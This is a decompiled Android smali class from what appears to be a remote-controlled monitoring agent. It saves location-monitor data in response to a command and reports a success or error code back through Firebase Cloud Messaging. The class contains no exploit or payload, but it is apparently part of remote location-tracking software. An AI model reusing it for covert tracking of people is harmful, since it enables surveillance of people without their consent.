.class public Lcom/hp/vd/module/monitor/location/PersisterRunnable;
.super Ljava/lang/Object;
.source "PersisterRunnable.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final TAG:Ljava/lang/String;

.field protected commandId:Ljava/lang/String;

.field protected commandToken:Ljava/lang/String;

.field protected context:Landroid/content/Context;

.field protected instance:Lcom/hp/vd/module/monitor/LocationMonitor;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/module/monitor/LocationMonitor;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, "LocCmdRecv::Persister"

    .line 14
    iput-object v0, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->TAG:Ljava/lang/String;

    .line 26
    iput-object p1, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->instance:Lcom/hp/vd/module/monitor/LocationMonitor;

    .line 27
    iput-object p2, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 28
    iput-object p3, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 30
    iput-object p4, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->context:Landroid/content/Context;

    .line 31
    iput-object p5, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->commandId:Ljava/lang/String;

    .line 32
    iput-object p6, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->commandToken:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    .line 38
    iget-object v0, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->instance:Lcom/hp/vd/module/monitor/LocationMonitor;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {v0, v1}, Lcom/hp/vd/module/monitor/LocationMonitor;->persistModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 41
    iget-object v0, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "LocCmdRecv::Persister"

    const-string v2, "dispatch(): there was an error persisting the module data."

    const/4 v3, 0x3

    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 47
    iget-object v1, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->context:Landroid/content/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->commandId:Ljava/lang/String;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->commandToken:Ljava/lang/String;

    const-string v4, "-2"

    const-string v5, "error persisting module data."

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->sendResponse(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 50
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->context:Landroid/content/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->commandId:Ljava/lang/String;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->commandToken:Ljava/lang/String;

    const-string v4, "1"

    const-string v5, "success"

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->sendResponse(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 56
    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/location/PersisterRunnable;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 58
    new-instance v1, Lcom/hp/vd/module/monitor/location/PersisterRunnable$1;

    invoke-direct {v1, p0}, Lcom/hp/vd/module/monitor/location/PersisterRunnable$1;-><init>(Lcom/hp/vd/module/monitor/location/PersisterRunnable;)V

    .line 66
    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :goto_0
    return-void
.end method

.method protected sendResponse(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 72
    new-instance v0, Lcom/hp/vd/data/FcmCommandResponse;

    invoke-direct {v0}, Lcom/hp/vd/data/FcmCommandResponse;-><init>()V

    .line 74
    iput-object p2, v0, Lcom/hp/vd/data/FcmCommandResponse;->id:Ljava/lang/String;

    .line 75
    iput-object p3, v0, Lcom/hp/vd/data/FcmCommandResponse;->token:Ljava/lang/String;

    .line 77
    iput-object p4, v0, Lcom/hp/vd/data/FcmCommandResponse;->resultCode:Ljava/lang/String;

    .line 78
    iput-object p5, v0, Lcom/hp/vd/data/FcmCommandResponse;->resultBody:Ljava/lang/String;

    .line 80
    new-instance p2, Lcom/hp/vd/fcm/Sender;

    invoke-direct {p2, p1, v0}, Lcom/hp/vd/fcm/Sender;-><init>(Landroid/content/Context;Lcom/hp/vd/data/FcmCommandResponse;)V

    invoke-virtual {p2}, Lcom/hp/vd/fcm/Sender;->run()V

    return-void
.end method
